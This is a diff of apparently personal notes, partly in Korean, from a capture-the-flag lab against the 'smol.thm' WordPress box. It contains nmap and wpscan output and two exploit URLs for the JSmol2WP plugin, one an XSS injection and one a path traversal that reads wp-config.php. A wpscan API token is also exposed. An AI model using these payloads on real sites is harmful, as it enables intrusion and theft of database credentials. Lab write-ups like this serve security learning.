@@ -1,10 +1,10 @@
-# IP: 10.10.180.10
+# IP: 10.10.198.23
 
 # nmap -> 22, 80
 
 http://www.smol.thm
 
-Nmap scan report for 10.10.180.10
+Nmap scan report for 10.10.198.23
 Host is up (0.29s latency).
 Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -95,7 +95,7 @@ wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2Xae
 
 ---
 
-[+] URL: http://www.smol.thm/ [10.10.180.10]
+[+] URL: http://www.smol.thm/ [10.10.198.23]
 [+] Started: Thu Jul 24 15:03:12 2025
 
 Interesting Finding(s):
@@ -168,6 +168,9 @@ Interesting Finding(s):
 |
 | [!] 2 vulnerabilities identified:
 |
+
+# 취약점
+
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 | References:
 | - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
@@ -203,3 +206,15 @@ Checking Config Backups - Time: 00:00:11 <======================================
 [+] Data Received: 254.962 KB
 [+] Memory used: 265.801 MB
 [+] Elapsed time: 00:00:28
+
+# 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속
+
+# IP: 10.10.198.23, www.smol.thm -> CVE 취약점 확인
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/9489e7ee-b9c5-4def-b337-13f30ef6321f/image.png)
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/b10129e7-2e41-42c0-b15d-76ed89c0c5f3/image.png)
